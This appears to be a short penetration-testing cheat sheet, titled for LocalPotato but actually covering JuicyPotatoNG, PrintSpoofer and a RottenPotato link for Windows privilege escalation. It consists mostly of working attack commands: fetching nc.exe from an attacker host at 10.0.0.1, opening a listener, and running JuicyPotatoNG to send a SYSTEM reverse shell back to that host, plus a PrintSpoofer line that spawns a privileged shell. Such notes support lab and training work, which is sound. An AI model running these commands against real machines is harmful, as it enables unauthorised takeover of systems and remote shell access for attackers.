---
title: Windows PrivEsc with LocalPotato
description:
tags:
    - Privilege Escalation
    - Windows
refs:
    - https://jlajara.gitlab.io/Potatoes_Windows_Privesc
    - https://github.com/decoder-it/LocalPotato
    - https://www.localpotato.com/localpotato_html/LocalPotato.html
    - https://tryhackme.com/room/localpotato
date: 2023-04-08
draft: false
---

## JuicyPotato

We can use a payload from [here](https://github.com/antonioCoco/JuicyPotatoNG).  
Before exploiting, we need to upload **`nc.exe`** (it is available from [here](https://github.com/int0x33/nc.exe/)) to the target machine.

```powershell
Invoke-WebRequest -Uri http://10.0.0.1:8000/nc.exe -OutFile c:\Temp\nc.exe
```

Next start a listener in local machine.

```bash
nc -lvnp 4444
```

Then execute **`JuicyPotato`** in target machine.

```powershell
JuicyPotatoNG.exe -t * -p "c:\Temp\nc.exe" -a "10.0.0.1 4444 -e cmd.exe"
```

<br />

## PrintSpoofer

**[this repo](https://github.com/dievus/printspoofer)** is available for compiled executable.

```bash
PrintSpoofer.exe -i -c cmd
```

<br />

## RottenPotato

Reference: [https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
